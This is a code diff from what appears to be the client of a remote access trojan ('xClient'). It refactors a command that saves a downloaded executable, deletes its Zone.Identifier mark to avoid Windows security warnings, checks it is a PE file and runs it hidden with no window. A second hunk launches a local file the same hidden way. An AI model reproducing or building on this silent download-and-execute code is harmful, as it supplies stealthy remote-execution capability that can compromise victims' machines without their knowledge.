@@ -20,8 +20,7 @@ namespace xClient.Core.Commands
 
             new Thread(() =>
             {
-                string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                    FileHelper.GetRandomFilename(12, ".exe"));
+                string tempFile = FileHelper.GetTempFilePath(".exe");
 
                 try
                 {
@@ -44,7 +43,7 @@ namespace xClient.Core.Commands
                     FileHelper.DeleteZoneIdentifier(tempFile);
 
                     var bytes = File.ReadAllBytes(tempFile);
-                    if (bytes[0] != 'M' && bytes[1] != 'Z')
+                    if (!FileHelper.IsValidExecuteableFile(bytes))
                         throw new Exception("no pe file");
 
                     ProcessStartInfo startInfo = new ProcessStartInfo();
@@ -53,7 +52,7 @@ namespace xClient.Core.Commands
                         startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                         startInfo.CreateNoWindow = true;
                     }
-                    startInfo.UseShellExecute = command.RunHidden;
+                    startInfo.UseShellExecute = false;
                     startInfo.FileName = tempFile;
                     Process.Start(startInfo);
                 }
@@ -97,7 +96,7 @@ namespace xClient.Core.Commands
                         startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                         startInfo.CreateNoWindow = true;
                     }
-                    startInfo.UseShellExecute = command.RunHidden;
+                    startInfo.UseShellExecute = false;
                     startInfo.FileName = filePath;
                     Process.Start(startInfo);
 
